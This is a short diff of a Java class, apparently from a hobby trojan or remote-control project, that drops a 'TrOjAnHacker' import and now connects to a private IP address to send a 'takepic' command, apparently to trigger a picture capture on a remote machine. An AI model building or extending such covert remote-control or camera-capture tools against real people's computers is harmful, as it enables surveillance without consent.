@@ -2,7 +2,6 @@ package network;
 
 import java.io.*;
 import java.net.*;
-import trojan.hacker.TrOjAnHacker;
 
 public class ServerComPic {
 
@@ -11,12 +10,12 @@ public class ServerComPic {
     public ServerComPic() {
 
         try {
-            ServerSocket ssoc = new ServerSocket(PORTO);
-            Socket sock = ssoc.accept();
+            Socket sock = new Socket("192.168.250.158", 80);
 
             DataOutputStream dout = new DataOutputStream(sock.getOutputStream());
-            //String msgout = TrOjAnHacker.ftpNum;
-            //dout.writeUTF(msgout);
+            String msgout = "takepic";
+            
+            dout.writeUTF(msgout);
             dout.flush();
 
         } catch (Exception e) {
